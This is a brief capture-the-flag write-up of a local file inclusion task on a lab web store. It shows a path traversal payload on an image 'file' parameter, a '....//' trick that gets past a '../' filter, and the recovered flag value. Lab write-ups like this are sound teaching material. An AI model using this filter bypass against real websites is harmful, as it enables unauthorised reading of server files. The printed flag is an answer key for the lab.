===================
"Task - LFI"
#===================

Found that the product image endpoint uses a `file` parameter:

    http://nahamstore.thm/product/picture/?file=cbf45788a7c3ff5c2fab3cbe740595d4.jpg

Tried the obvious path traversal:

    ../../../../lfi/flag.txt

but that doesn't work, presumably because `../` is being filtered.

Then we can bypass this with:

    ....//....//....//....//....//....//lfi/flag.txt

The `....//` effectively gets around the filter and allows the application to resolve the path as directory traversal.

Checking the raw response instead revealed:

    {7ef60e74b711f4c3a1fdf5a131ebf863}

So the process was essentially:

    file parameter
        ↓
    Path Traversal / LFI
        ↓
    /lfi/flag.txt
        ↓
    Read the file contents
        ↓
    Flag: {7ef60e74b711f4c3a1fdf5a131ebf863}
